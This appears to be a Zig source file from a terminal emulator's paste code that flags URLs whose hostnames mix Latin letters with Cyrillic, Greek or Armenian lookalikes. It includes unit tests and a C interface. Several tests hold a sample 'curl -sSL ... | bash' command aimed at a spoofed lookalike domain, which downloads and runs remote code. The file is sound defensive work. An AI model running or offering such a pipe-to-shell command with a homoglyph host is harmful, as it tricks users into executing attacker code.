//! Detect mixed-script hostname labels inside URL-like spans in paste data.
//!
//! v1 uses ASCII-vs-block heuristics for labels (Latin letters + Cyrillic /
//! Greek / Armenian lookalikes, etc.). A future revision may replace the
//! per-label check using [Unicode UTS #39](https://www.unicode.org/reports/tr39/)
//! data (e.g. `confusables.txt`, `ScriptExtensions.txt`) while keeping URL
//! extraction and `mixedScriptUrlRisk` stable.

const std = @import("std");

pub const Utf8Span = extern struct {
    start: usize,
    end: usize,
};

pub const first_mixed_script_url_report_max_spans = 128;

pub fn firstMixedScriptUrlReport(
    data: []const u8,
    span_out: []Utf8Span,
) ?struct { url: Utf8Span, total_spans: usize, written: usize } {
    const url = firstMixedScriptUrlByteRange(data) orelse return null;
    const plen = schemePrefixLen(data, url.start) orelse return null;
    const auth_start = url.start + plen;
    if (auth_start > url.end) {
        return .{ .url = url, .total_spans = 0, .written = 0 };
    }
    const authority = data[auth_start..url.end];
    const host = hostFromAuthority(authority);
    if (host.len == 0) {
        return .{ .url = url, .total_spans = 0, .written = 0 };
    }
    const host_rel: usize = @intCast(@intFromPtr(host.ptr) - @intFromPtr(authority.ptr));
    const host_start_in_data = auth_start + host_rel;

    var total: usize = 0;
    collectSuspiciousLabelSpans(host, host_start_in_data, span_out, &total);
    const written = @min(total, span_out.len);
    return .{ .url = url, .total_spans = total, .written = written };
}

/// True if pasting `data` may include a misleading URL (mixed-script label).
pub fn mixedScriptUrlRisk(data: []const u8) bool {
    return suspiciousSpansInPasteBuffer(data, &.{}) > 0;
}

/// UTF-8 byte range of the first `scheme://authority` fragment that has mixed-script URL risk.
/// `end` is exclusive (same boundary as `authorityEnd`).
pub fn firstMixedScriptUrlByteRange(data: []const u8) ?Utf8Span {
    var i: usize = 0;
    while (i < data.len) {
        if (schemePrefixLen(data, i)) |plen| {
            const auth_start = i + plen;
            if (auth_start > data.len) break;
            const auth_end = authorityEnd(data, auth_start);
            if (mixedScriptUrlRisk(data[i..auth_end])) {
                return .{ .start = i, .end = auth_end };
            }
            i = auth_end;
        } else {
            i += 1;
        }
    }
    return null;
}

/// All suspicious (non-Latin confusable) letters in mixed-script URL host labels.
pub fn suspiciousSpansInPasteBuffer(data: []const u8, out: []Utf8Span) usize {
    var found: usize = 0;
    var i: usize = 0;
    while (i < data.len) {
        if (schemePrefixLen(data, i)) |plen| {
            const auth_start = i + plen;
            if (auth_start > data.len) break;
            const auth_end = authorityEnd(data, auth_start);
            const authority = data[auth_start..auth_end];
            const host = hostFromAuthority(authority);
            if (host.len > 0) {
                const host_rel: usize = @intCast(@intFromPtr(host.ptr) - @intFromPtr(authority.ptr));
                const host_start_in_data = auth_start + host_rel;
                collectSuspiciousLabelSpans(host, host_start_in_data, out, &found);
            }
            i = auth_end;
        } else {
            i += 1;
        }
    }
    return found;
}

/// GTK `gtk_text_buffer_get_iter_at_offset` uses a character (Unicode scalar) offset, not UTF-8 bytes.
pub fn utf8ByteOffsetToCharIndex(data: []const u8, byte_offset: usize) usize {
    std.debug.assert(byte_offset <= data.len);
    const prefix = data[0..byte_offset];
    var count: usize = 0;
    var it = (std.unicode.Utf8View.init(prefix) catch return 0).iterator();
    while (it.nextCodepoint()) |_| {
        count += 1;
    }
    return count;
}

fn collectSuspiciousLabelSpans(
    host: []const u8,
    host_start_in_data: usize,
    out: []Utf8Span,
    found: *usize,
) void {
    var start: usize = 0;
    while (start <= host.len) {
        const dot = std.mem.indexOfScalarPos(u8, host, start, '.');
        const end = dot orelse host.len;
        if (end > start) {
            const label = host[start..end];
            if (labelLooksLikeMixedScriptLatinHomoglyph(label)) {
                const label_start_in_data = host_start_in_data + start;
                collectConfusableCodepointSpans(label, label_start_in_data, out, found);
            }
        }
        if (dot == null) break;
        start = end + 1;
    }
}

fn collectConfusableCodepointSpans(
    label: []const u8,
    label_start_in_data: usize,
    out: []Utf8Span,
    found: *usize,
) void {
    const view = std.unicode.Utf8View.init(label) catch return;
    var it = view.iterator();
    var byte_in_label: usize = 0;
    while (it.nextCodepointSlice()) |cp_slice| {
        const cp = std.unicode.utf8Decode(cp_slice) catch break;
        if (isConfusableNonLatinLetter(cp)) {
            if (found.* < out.len) {
                out[found.*] = .{
                    .start = label_start_in_data + byte_in_label,
                    .end = label_start_in_data + byte_in_label + cp_slice.len,
                };
            }
            found.* += 1;
        }
        byte_in_label += cp_slice.len;
    }
}

/// Exported for tests and a future TR39-backed implementation.
pub fn labelLooksLikeMixedScriptLatinHomoglyph(label: []const u8) bool {
    if (label.len == 0) return false;
    const view = std.unicode.Utf8View.init(label) catch return false;
    var it = view.iterator();
    var ascii_letter = false;
    var confusable = false;
    while (it.nextCodepoint()) |cp| {
        if (isAsciiLetter(cp)) ascii_letter = true;
        if (isConfusableNonLatinLetter(cp)) confusable = true;
        if (ascii_letter and confusable) return true;
    }
    return false;
}

fn schemePrefixLen(data: []const u8, i: usize) ?usize {
    const rest = data[i..];
    const schemes = [_][]const u8{
        "https://",
        "http://",
        "ws://",
        "wss://",
        "ftp://",
    };
    for (schemes) |s| {
        if (rest.len >= s.len and std.ascii.eqlIgnoreCase(rest[0..s.len], s)) {
            return s.len;
        }
    }
    return null;
}

fn authorityEnd(data: []const u8, start: usize) usize {
    var j = start;
    while (j < data.len) : (j += 1) {
        switch (data[j]) {
            '/',
            '?',
            '#',
            ' ',
            '\t',
            '\n',
            '\r',
            '|',
            ')',
            ']',
            '"',
            '\'',
            '\\',
            => return j,
            else => {},
        }
    }
    return j;
}

fn hostFromAuthority(authority: []const u8) []const u8 {
    var h = authority;
    if (std.mem.lastIndexOfScalar(u8, h, '@')) |at| {
        h = h[at + 1 ..];
    }
    if (h.len > 0 and h[0] == '[') {
        if (std.mem.indexOfScalar(u8, h, ']')) |close| {
            return h[1..close];
        }
        return if (h.len > 1) h[1..] else "";
    }
    if (std.mem.lastIndexOfScalar(u8, h, ':')) |colon| {
        h = h[0..colon];
    }
    return h;
}

fn isAsciiLetter(cp: u21) bool {
    return (cp >= 'A' and cp <= 'Z') or (cp >= 'a' and cp <= 'z');
}

fn isConfusableNonLatinLetter(cp: u21) bool {
    if (cp >= 0x0400 and cp <= 0x052F) return true;
    if (cp >= 0x0370 and cp <= 0x03FF) return true;
    if (cp >= 0x0530 and cp <= 0x058F) return true;
    if (cp == 0x0261) return true;
    return false;
}

// -----------------------------------------------------------------------------
// C ABI (`include/ghostty/vt/paste.h`).

/// Matches `ghostty_paste_homoglyph_report_t` in `include/ghostty/vt/paste.h`.
pub const GhosttyPasteHomoglyphReport = extern struct {
    url_start: usize,
    url_end: usize,
    span_total: usize,
    span_written: usize,
    spans: [first_mixed_script_url_report_max_spans]Utf8Span,
};

fn homoglyphSliceFromC(data: ?[*]const u8, len: usize) []const u8 {
    return if (data) |p| p[0..len] else &.{};
}

pub fn homoglyphSuspiciousSpans(
    data: ?[*]const u8,
    len: usize,
    out: ?[*]Utf8Span,
    max_out: usize,
) callconv(.c) usize {
    const slice = homoglyphSliceFromC(data, len);
    const out_spans: []Utf8Span = if (out) |p|
        @as([*]Utf8Span, @ptrCast(p))[0..max_out]
    else
        &.{};
    return suspiciousSpansInPasteBuffer(slice, out_spans);
}

pub fn homoglyphFirstUrlRange(
    data: ?[*]const u8,
    len: usize,
    out_start: *usize,
    out_end: *usize,
) callconv(.c) c_int {
    const slice = homoglyphSliceFromC(data, len);
    const r = firstMixedScriptUrlByteRange(slice) orelse return 0;
    out_start.* = r.start;
    out_end.* = r.end;
    return 1;
}

/// Fills `out` on success (returns 1). On failure, zeroes `*out` and returns 0.
pub fn homoglyphFirstUrlReport(
    data: ?[*]const u8,
    len: usize,
    out: ?*GhosttyPasteHomoglyphReport,
) callconv(.c) c_int {
    const o = out orelse return 0;
    const slice = homoglyphSliceFromC(data, len);
    var span_buf: [first_mixed_script_url_report_max_spans]Utf8Span = undefined;
    const rep = firstMixedScriptUrlReport(slice, &span_buf) orelse {
        o.* = std.mem.zeroes(GhosttyPasteHomoglyphReport);
        return 0;
    };
    o.url_start = rep.url.start;
    o.url_end = rep.url.end;
    o.span_total = rep.total_spans;
    o.span_written = rep.written;
    @memcpy(o.spans[0..rep.written], span_buf[0..rep.written]);
    if (rep.written < o.spans.len) {
        @memset(o.spans[rep.written..], std.mem.zeroes(Utf8Span));
    }
    return 1;
}

test "firstMixedScriptUrlByteRange: finds scheme through authority" {
    const testing = std.testing;
    const payload = "curl https://\u{0456}nstall.example-cl\u{0456}.dev/foo";
    const r = firstMixedScriptUrlByteRange(payload).?;
    try testing.expectEqualStrings("https://\u{0456}nstall.example-cl\u{0456}.dev", payload[r.start..r.end]);
}

test "mixedScriptUrlRisk: clean ascii host" {
    const testing = std.testing;
    try testing.expect(!mixedScriptUrlRisk("curl https://install.example-cli.dev/foo"));
}

test "mixedScriptUrlRisk: Cyrillic i mixed with Latin in label" {
    const testing = std.testing;
    const payload = "curl -sSL https://\u{0456}nstall.example-cl\u{0456}.dev | bash";
    try testing.expect(mixedScriptUrlRisk(payload));
}

test "label: Cyrillic i among Latin" {
    const testing = std.testing;
    try testing.expect(labelLooksLikeMixedScriptLatinHomoglyph("іnstall"));
}

test "label: pure ASCII" {
    const testing = std.testing;
    try testing.expect(!labelLooksLikeMixedScriptLatinHomoglyph("install"));
}

test "label: pure Cyrillic no ascii letters" {
    const testing = std.testing;
    try testing.expect(!labelLooksLikeMixedScriptLatinHomoglyph("пример"));
}

test "label: mixed Cyrillic a and Latin" {
    const testing = std.testing;
    try testing.expect(labelLooksLikeMixedScriptLatinHomoglyph("аpple"));
}

test "suspiciousSpansInPasteBuffer: Cyrillic i positions" {
    const testing = std.testing;
    const payload = "curl -sSL https://\u{0456}nstall.example-cl\u{0456}.dev | bash";
    var spans: [8]Utf8Span = undefined;
    const n = suspiciousSpansInPasteBuffer(payload, &spans);
    try testing.expectEqual(@as(usize, 2), n);
    try testing.expectEqual(@as(usize, 2), spans[0].end - spans[0].start);
    try testing.expectEqual(@as(usize, 2), spans[1].end - spans[1].start);
    try testing.expect(spans[0].start < spans[1].start);
}

test "utf8ByteOffsetToCharIndex" {
    const testing = std.testing;
    const s = "a\u{0456}b";
    try testing.expectEqual(@as(usize, 0), utf8ByteOffsetToCharIndex(s, 0));
    try testing.expectEqual(@as(usize, 1), utf8ByteOffsetToCharIndex(s, 1));
    try testing.expectEqual(@as(usize, 2), utf8ByteOffsetToCharIndex(s, 3));
    try testing.expectEqual(@as(usize, 3), utf8ByteOffsetToCharIndex(s, s.len));
}

test "firstMixedScriptUrlReport matches filtered full-buffer spans" {
    const testing = std.testing;
    const payload = "curl -sSL https://\u{0456}nstall.example-cl\u{0456}.dev | bash";
    var buf: [first_mixed_script_url_report_max_spans]Utf8Span = undefined;
    const rep = firstMixedScriptUrlReport(payload, &buf).?;
    try testing.expectEqual(@as(usize, 2), rep.total_spans);
    try testing.expectEqual(@as(usize, 2), rep.written);
    try testing.expectEqualStrings("https://\u{0456}nstall.example-cl\u{0456}.dev", payload[rep.url.start..rep.url.end]);

    var all: [8]Utf8Span = undefined;
    const n_all = suspiciousSpansInPasteBuffer(payload, &all);
    try testing.expectEqual(@as(usize, 2), n_all);
    try testing.expectEqual(buf[0].start, all[0].start);
    try testing.expectEqual(buf[0].end, all[0].end);
    try testing.expectEqual(buf[1].start, all[1].start);
    try testing.expectEqual(buf[1].end, all[1].end);
}
